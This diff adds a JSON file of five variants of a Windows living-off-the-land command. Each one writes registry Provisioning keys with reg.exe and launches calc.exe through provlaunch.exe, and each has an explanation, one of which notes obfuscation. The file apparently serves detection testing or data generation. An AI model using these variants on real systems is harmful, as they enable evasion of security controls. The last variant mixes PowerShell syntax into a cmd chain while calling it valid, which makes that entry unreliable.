@@ -1,0 +1,22 @@
+[
+  {
+    "output": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 & reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe & provlaunch.exe LOLBin",
+    "explanation": "The original command is restructured by removing quotes and using standard command concatenation. The full path to provlaunch.exe is omitted since it's in the system path, and the command remains functionally equivalent."
+  },
+  {
+    "output": "reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\" /v altitude /t REG_DWORD /d 0 & reg.exe add \"HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2\" /v Commandline /d calc.exe & provlaunch.exe LOLBin",
+    "explanation": "Quotes are added around registry paths for syntactic variation, but the command remains functionally identical."
+  },
+  {
+    "output": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 & reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe & C:\\Windows\\System32\\provlaunch.exe LOLBin",
+    "explanation": "The full path to provlaunch.exe is explicitly used, but it is still a valid variation of the original command."
+  },
+  {
+    "output": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 & reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe & cmd /c provlaunch.exe LOLBin",
+    "explanation": "The command is wrapped in a cmd /c call to simulate execution through a shell, which is a common obfuscation technique."
+  },
+  {
+    "output": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0 & reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe & start-process -FilePath provlaunch.exe -ArgumentList LOLBin",
+    "explanation": "The command is rewritten using PowerShell's start-process cmdlet to execute provlaunch.exe, which is a valid alternative execution method."
+  }
+]
